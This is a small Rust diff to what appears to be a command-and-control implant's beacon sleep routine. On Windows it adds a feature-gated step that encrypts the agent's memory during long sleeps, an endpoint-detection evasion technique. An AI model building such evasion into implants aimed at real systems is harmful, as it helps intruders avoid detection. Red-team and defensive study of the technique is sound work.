@@ -199,6 +199,27 @@ async fn sleep_until_next_cycle(agent: &ImixAgent, start: Instant) -> Result<()>
         interval,
         jitter
     );
+
+    #[cfg(all(windows, feature = "mem-obfuscation"))]
+    {
+        if (sleep_secs as f64) >= crate::memguard::min_encrypt_interval_secs() {
+            // Engage the watchdog dormancy/encrypt cycle. The agent worker stays
+            // free (parked on the blocking pool) while the watchdog owns the
+            // encrypted window, and wakes when the cycle completes.
+            if crate::memguard::engage_memguard_sleep(sleep_secs as f64).await {
+                return Ok(());
+            }
+            // Watchdog unavailable: fall through to the normal sleep path.
+        } else {
+            #[cfg(feature = "print_debug")]
+            log::info!(
+                "memguard skip: below threshold (sleep={:.2}s < min={:.2})",
+                sleep_secs,
+                crate::memguard::MIN_ENCRYPT_INTERVAL_SECS
+            );
+        }
+    }
+
     tokio::time::sleep(delay).await;
     Ok(())
 }
